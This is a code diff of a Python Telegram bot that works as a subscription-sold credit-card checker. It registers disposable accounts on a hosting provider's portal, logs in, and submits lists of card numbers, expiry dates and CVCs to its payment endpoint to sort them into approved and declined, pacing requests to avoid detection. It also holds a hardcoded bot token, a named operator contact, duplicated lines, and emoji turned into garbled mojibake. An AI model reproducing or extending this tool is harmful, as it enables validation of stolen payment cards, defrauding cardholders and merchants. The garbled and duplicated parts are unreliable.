@@ -16,36 +16,6 @@ def generate_email(domain="necub.com"):
     prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
     return f"{prefix}@{domain}"
 
-# ==============================
-# BIN LOOKUP FUNCTION
-def get_card_info(card_number):
-    """Get card BIN information"""
-    try:
-        bin_number = str(card_number)[:6]
-        url = f"https://lookup.binlist.net/{bin_number}"
-        
-        headers = {
-            "Accept-Version": "3"
-        }
-        
-        response = requests.get(url, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            data = response.json()
-            return {
-                "BIN": bin_number,
-                "Scheme": data.get("scheme", "Unknown"),
-                "Type": data.get("type", "Unknown"),
-                "Brand": data.get("brand", "Unknown"),
-                "Country": data.get("country", {}).get("name", "Unknown"),
-                "Bank": data.get("bank", {}).get("name", "Unknown")
-            }
-        else:
-            return None
-    except Exception as e:
-        print(f"BIN lookup error: {e}")
-        return None
-
 # BOT TOKEN
 TOKEN = "7707283677:AAF0rE6MKt-HBq8_MfyQ00V28y_l3Tnu-HM"
 bot = telebot.TeleBot(TOKEN)
@@ -58,7 +28,7 @@ ADMIN_IDS = [5895491379]  # Your ID
 
 # CONTACT INFO
 CONTACT_INFO = {
-    'name': 'Mahmoud Saad 🥷🏻',
+    'name': 'Mahmoud Saad ðŸ¥·ðŸ»',
     'username': '@FastSpeedtest',
     'id': 5895491379
 }
@@ -541,6 +511,10 @@ def generate_admin_list():
     markup = InlineKeyboardMarkup(row_width=1)
     
     admins = get_all_admins()
+    """Generate admin management panel"""
+    markup = InlineKeyboardMarkup(row_width=1)
+    
+    admins = get_all_admins()
     if admins:
         markup.add(InlineKeyboardButton("📝 Current Admins:", callback_data="none"))
         for admin_id, username in admins:
@@ -555,6 +529,7 @@ def generate_admin_list():
     )
     markup.add(InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
     return markup
+
 
 def generate_subscription_panel():
     """Generate subscription management panel"""
@@ -597,7 +572,7 @@ def run_check(chat_id):
     
     # Register new account
     if not register_account(email):
-        s["response"] = "❌ Account registration failed"
+        s["response"] = "âŒ Account registration failed"
         stats[chat_id] = s
         return
 
@@ -606,7 +581,7 @@ def run_check(chat_id):
     login_response = session.post("https://portal.budgetvm.com/auth/login", data=login_data)
     
     if login_response.status_code != 200:
-        s["response"] = "❌ Login failed"
+        s["response"] = "âŒ Login failed"
         stats[chat_id] = s
         return
 
@@ -621,16 +596,16 @@ def run_check(chat_id):
     session.post("https://portal.budgetvm.com/auth/googleAsk", data=google_data)
 
     if "ePortalv1" not in session.cookies.get_dict():
-        s["response"] = "❌ Login/GoogleAsk failed"
+        s["response"] = "âŒ Login/GoogleAsk failed"
         stats[chat_id] = s
         return
 
-    print(f"✅ Successfully logged in with: {email}")
+    print(f"âœ… Successfully logged in with: {email}")
     
     # Check cards with delay
     for i, card in enumerate(cards):
         if stop_flag.get(chat_id):
-            s["response"] = "ℹ️ Check stopped"
+            s["response"] = "â¹ï¸ Check stopped"
             stats[chat_id] = s
             break
 
@@ -641,15 +616,15 @@ def run_check(chat_id):
             card_number, exp_month, exp_year, cvc = card.split("|")
         except:
             s["cvv"] += 1
-            s["response"] = "❌ Invalid card format"
+            s["response"] = "âŒ Invalid card format"
             continue
 
         # Add 15 second delay between card requests (except for first card)
         if i > 0:
-            print(f"⏳ Waiting 15 seconds before next card...")
+            print(f"â³ Waiting 15 seconds before next card...")
             for countdown in range(15, 0, -1):
                 if stop_flag.get(chat_id):
-                    s["response"] = "ℹ️ Check stopped"
+                    s["response"] = "â¹ï¸ Check stopped"
                     stats[chat_id] = s
                     return
                 time.sleep(1)
@@ -669,7 +644,7 @@ def run_check(chat_id):
 
         if "id" not in resp_json:
             s["cvv"] += 1
-            s["response"] = "❌ Token creation failed"
+            s["response"] = "âŒ Token creation failed"
         else:
             token_id = resp_json["id"]
             card_response = session.post(
@@ -684,7 +659,6 @@ def run_check(chat_id):
                 s["unknown"] += 1
                 s["response"] = "❓ Unknown response"
                 continue
-
             result = str(resp_json.get("result",""))
             if resp_json.get("success") is True:
                 s["approved"] += 1
@@ -727,7 +701,7 @@ def send_welcome(message):
     
     if not check_subscription(user_id):
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
+        markup.add(InlineKeyboardButton("ðŸ'¬ Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
         
         bot.send_message(
             message.chat.id, 
@@ -779,7 +753,7 @@ def admin_panel(message):
     user_id = message.from_user.id
     
     if not is_admin(user_id):
-        bot.send_message(message.chat.id, "🚫 Access denied! Admin only.")
+        bot.send_message(message.chat.id, "ðŸš« Access denied! Admin only.")
         return
     
     stats = get_user_stats()
@@ -804,7 +778,7 @@ def ask_for_cards(message):
     
     if not check_subscription(user_id):
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
+        markup.add(InlineKeyboardButton("ðŸ'¬ Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
         
         bot.send_message(
             message.chat.id, 
